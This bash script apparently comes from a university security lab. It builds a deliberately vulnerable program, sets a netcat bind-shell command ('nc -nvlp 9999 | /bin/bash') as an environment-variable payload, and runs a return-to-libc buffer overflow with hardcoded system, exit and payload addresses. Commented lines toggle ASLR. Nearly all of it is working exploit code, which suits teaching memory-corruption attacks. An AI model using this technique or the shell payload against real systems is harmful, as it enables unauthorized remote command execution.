#!/bin/bash

# CD to the assignment directory
cd ./assignment

# make the project
make --quiet

# CD to the upper level directory
cd ..

# Clear screen
bash -c 'clear'

# Toggle ASLR
# echo
# echo -n "Disabling ASLR... " && bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space' && echo "done."
# echo -n "Enabling ASLR... " && bash -c 'echo 2 > /proc/sys/kernel/randomize_va_space' && echo "done."

# Set netcat payload as environment variable
export PAYLOAD='nc -nvlp 9999 | /bin/bash'
echo "PAYLOAD is locally set to: $PAYLOAD"
echo
echo "To set globally, please run:"
echo "export PAYLOAD='$PAYLOAD'"
echo
echo "Check PAYLOAD has been globally set with env | grep PAYLOAD: " && env | grep PAYLOAD
echo
echo "Estimated PAYLOAD address is $(./assignment/getenv PAYLOAD)"

# Define address locations (little endian)
SYS_ADDR='\x70\xc3\xe0\xf7'  # use p system in GDB
EXIT_ADDR='\xd0\xee\xdf\xf7' # use p exit in GDB
PAY_ADDR='\xfe\xd7\xff\xff'  # verify using x/s <estimated addr> in GDB

echo
echo "System address is currently set to:     $SYS_ADDR"
echo "Exit address is currently set to:       $EXIT_ADDR"
echo "Payload address is currently set to:    $PAY_ADDR"
echo

# Run assignment
# ./assignment/flawed-program $(python -c "print('A'*13 + 'B'*4 + '$SYS_ADDR' + '$EXIT_ADDR' + '$PAY_ADDR')")
./assignment/flawed-program $(python -c "print('A'*13 + 'B'*4 + '$SYS_ADDR' + '$EXIT_ADDR' + '$PAY_ADDR')")
